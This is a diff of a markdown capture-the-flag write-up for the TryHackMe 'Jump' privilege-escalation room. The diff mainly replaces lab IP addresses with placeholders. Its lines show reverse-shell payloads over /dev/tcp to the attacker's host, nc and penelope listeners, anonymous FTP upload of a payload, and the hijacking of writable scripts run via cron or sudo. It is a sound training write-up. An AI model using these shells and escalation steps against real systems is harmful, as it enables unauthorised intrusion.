@@ -3,11 +3,22 @@
 
 **Pathway:** *Jr Penetration Tester* | **Section:** *Privilege Escalation* | **Challenge:** *[Jump](https://tryhackme.com/room/jump)*
 
-> **Spoiler warning:** This write-up contains the full exploitation chain, however no flag codes are shown in this write-up!
+> [!IMPORTANT]
+> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
 >
-> **Please note:** The IP addresses shown in this write-up were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe Paris VPN server.
+> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
 >
-> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit).
+> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
+> 
+> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
+>
+> - `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
+> - `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
+> - `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
+>
+> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.
+
+---
 
 ## About TryHackMe
 
@@ -28,8 +39,8 @@ anonymous → recon_user → dev_user → monitor_user → ops_user → root
 Confirmed lab details used during the walkthrough:
 
 ```text
-Target IP: 10.128.172.193
-Kali tun0 IP: 192.168.129.186
+Target IP: <TARGET_IP>
+Kali tun0 IP: <TUN0_IP>
 Attacker working directory: /tmp/VK
 ```
 
@@ -52,7 +63,7 @@ Click [HERE](https://github.com/Valikahn/TryHackMe-Writeups#tools-commonly-used)
 The first step was to identify open services on the target.
 
 ```bash
-rustscan -b 500 -a 10.128.172.193 --top -- -sC -sV -Pn -o rustscan-output.txt
+rustscan -b 500 -a <TARGET_IP> --top -- -sC -sV -Pn -o rustscan-output.txt
 ```
 
 The important findings were:
@@ -74,7 +85,7 @@ On Kali, we prepared a reverse shell payload.
 cd /tmp/VK
 cat > recon.sh <<'EOF'
 #!/bin/bash
-bash -c 'bash -i >& /dev/tcp/192.168.129.186/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'
 EOF
 chmod +x recon.sh
 ```
@@ -88,7 +99,7 @@ nc -lvnp 4444
 Then we logged into FTP anonymously and uploaded the payload.
 
 ```bash
-ftp 10.128.172.193
+ftp <TARGET_IP>
 ```
 
 FTP login:
@@ -202,7 +213,7 @@ Because `recon_user` could modify `/opt/dev/backup.sh`, we replaced it with a re
 On Kali, we started a Penelope listener:
 
 ```bash
-penelope -i 192.168.129.186 -p 5556
+penelope -i <TUN0_IP> -p 5556
 ```
 
 From the `recon_user` shell, we replaced `/opt/dev/backup.sh`:
@@ -210,7 +221,7 @@ From the `recon_user` shell, we replaced `/opt/dev/backup.sh`:
 ```bash
 cat > /opt/dev/backup.sh <<'EOF'
 #!/bin/bash
-setsid bash -i >& /dev/tcp/192.168.129.186/5556 0>&1
+setsid bash -i >& /dev/tcp/<TUN0_IP>/5556 0>&1
 EOF
 chmod +x /opt/dev/backup.sh
 ls -l /opt/dev/backup.sh
@@ -311,7 +322,7 @@ Because the healthcheck service repeatedly executed `ps` as `monitor_user`, this
 From Kali, we then connected over SSH using the matching private key.
 
 ```bash
-ssh -i /tmp/VK/jump_key -o StrictHostKeyChecking=no monitor_user@10.128.172.193
+ssh -i /tmp/VK/jump_key -o StrictHostKeyChecking=no monitor_user@<TARGET_IP>
 ```
 
 SSH login succeeded:
@@ -419,7 +430,7 @@ monitor_user can run deploy.sh as ops_user
 On Kali, we started a new Penelope listener:
 
 ```bash
-penelope -i 192.168.129.186 -p 5560
+penelope -i <TUN0_IP> -p 5560
 ```
 
 From the `monitor_user` shell, we replaced `/opt/app/deploy_helper.sh` with a reverse shell payload and executed the sudo rule:
@@ -427,7 +438,7 @@ From the `monitor_user` shell, we replaced `/opt/app/deploy_helper.sh` with a re
 ```bash
 cat > /opt/app/deploy_helper.sh <<'EOF'
 #!/bin/bash
-setsid bash -i >& /dev/tcp/192.168.129.186/5560 0>&1
+setsid bash -i >& /dev/tcp/<TUN0_IP>/5560 0>&1
 EOF
 chmod +x /opt/app/deploy_helper.sh
 sudo -u ops_user /usr/local/bin/deploy.sh
@@ -436,7 +447,7 @@ sudo -u ops_user /usr/local/bin/deploy.sh
 Penelope received a shell as `ops_user`:
 
 ```text
-[New Reverse Shell] => tryhackme-2404 10.128.172.193 Linux-x86_64 ops_user(1004)
+[New Reverse Shell] => tryhackme-2404 <TARGET_IP> Linux-x86_64 ops_user(1004)
 ```
 
 We confirmed the account and read the flag:
@@ -574,7 +585,7 @@ The vulnerabilities in this lab could be mitigated by:
 
 ## Disclaimer
 
-This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.
+This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.
 
 All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.
 
@@ -585,5 +596,5 @@ Never test, scan, exploit or access a system without clear and explicit authoris
 ---
 [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  
 
-**Powered on ☕ made with ❤️ by [Valikahn](https://github.com/Valikahn)**  
+**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
 ⭐ If this project is useful, consider starring it on GitHub.
